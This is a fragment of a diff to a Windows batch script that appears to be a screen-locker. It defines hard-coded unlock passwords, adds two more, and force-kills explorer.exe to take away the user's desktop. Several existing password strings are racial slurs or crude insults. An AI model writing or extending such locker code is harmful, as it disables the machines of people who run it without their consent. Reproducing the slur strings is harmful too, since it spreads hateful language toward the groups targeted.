@@ -6,6 +6,8 @@ set "pass1=thisniggasucksdude"
 set "pass2=niggersinparis"
 set "pass3=enesisiktim"
 set "pass4=usecodebuttersmoothfor10percentoffyourvapepurchase"
+set "pass5=lockntdeveloper"
+set "pass6=mtakusucksass"
 
 rem Kill explorer.exe
 taskkill /f /im explorer.exe >nul
